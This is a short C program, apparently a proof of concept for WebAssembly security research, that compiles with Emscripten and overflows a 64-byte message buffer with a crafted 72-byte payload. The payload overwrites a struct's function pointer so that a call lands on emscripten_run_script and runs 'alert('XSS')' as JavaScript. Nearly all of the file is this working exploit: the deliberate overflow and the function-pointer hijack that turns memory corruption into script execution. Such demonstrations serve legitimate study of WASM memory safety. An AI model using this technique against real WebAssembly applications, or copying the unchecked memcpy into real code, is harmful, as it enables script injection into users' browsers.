#include <stdint.h>
#include <stdio.h>
 #include <string.h>

 #include <emscripten.h>


 typedef struct Comms {
 char msg[64];
 uint16_t msg_len;
void (*out)(const char *);
 } Comms;

 void trigger(Comms *comms) {
 comms->out(comms->msg);
 }

 void communicate(const char *msg) {
 printf("%s", msg);
 }

 int main(void) {
 Comms comms;
 comms.out = &communicate;
 printf("&communicate: %p\n", &communicate); // 0x1
 printf("&emscripten_run_script: %p\n", &emscripten_run_script); // 0x2
 char *payload = "alert('XSS');// " 
 " " // + 16
 " " // + 16
 " " // + 16 to fill .msg = 64
 " " // + 2 for alignment = 66
 "\x40\x00" // + 2 bytes to fill .msg_len = 68
 "\x02\x00\x00\x00"; // + 4 bytes to overwrite .out= 72
 memcpy(comms.msg, payload, 72);
 emscripten_run_script("console.log('Porting my program to WASM!');");

 trigger(&comms);

 return 0;
 }